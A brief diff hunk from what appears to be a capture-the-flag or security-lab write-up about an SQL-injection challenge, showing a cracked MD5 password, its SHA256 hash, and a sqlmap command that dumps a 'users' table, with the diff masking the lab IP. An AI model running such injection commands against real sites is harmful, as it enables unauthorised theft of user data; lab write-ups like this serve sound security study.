@@ -98,7 +98,7 @@ The decrypted hash md5 give: *FortyTwo*
 If we encrypt `fortytwo` with SHA256 we have: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
 
 ### Sqlmap tool
-`sqlmap -u "http://192.168.2.128/?page=member&id=1&Submit=Submit#" --dump -T users`
+`sqlmap -u "http://x.x.x.x/?page=member&id=1&Submit=Submit#" --dump -T users`
 
 ```
 Database: Member_Sql_Injection
